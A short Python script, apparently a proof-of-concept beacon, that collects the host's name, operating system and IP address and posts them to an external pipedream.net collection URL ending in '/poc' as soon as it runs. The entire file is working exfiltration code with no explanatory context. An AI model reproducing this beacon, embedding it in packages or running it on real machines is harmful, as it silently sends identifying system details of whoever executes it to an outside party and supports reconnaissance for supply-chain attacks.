import socket
import platform
import requests

def send_info_to_server(server_url):
    hostname = socket.gethostname()

    osname = platform.system()

    ip = socket.gethostbyname(hostname)

    data = {
        "hostname": hostname,
        "osname": osname,
        "ip": ip
    }

    try:
        response = requests.post(server_url, json=data)
        if response.status_code == 200:
            print("Data sent successfully to the server.")
        else:
            print(f"Failed to send data. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error: {str(e)}")

def main():
    server_url = "https://eowdq5q6u6qkhxe.m.pipedream.net/poc"
    send_info_to_server(server_url)

if __name__ == "__main__":
    main()

